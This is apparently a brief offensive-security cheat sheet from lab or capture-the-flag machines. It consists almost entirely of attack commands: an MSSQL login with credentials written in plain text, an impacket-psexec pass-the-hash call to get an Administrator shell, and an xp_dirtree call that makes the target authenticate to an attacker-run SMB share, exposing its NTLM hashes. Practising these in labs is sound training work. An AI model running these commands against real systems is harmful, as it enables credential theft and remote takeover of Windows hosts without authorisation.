## mssql 

```sh
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

**note** add dc name in host file 


## psexec `to get a shell`
```sh
impacket-psexec Administrator@10.10.10.175 -hashes lm:ntlm
```


## Pwning a shell via MSSQL DBMS 

`on my kali`

```sh
impacket-smbserver share -smb2support /tmp/
```

`on the box`

```sh
exec xp_dirtree '//IP/share'
```

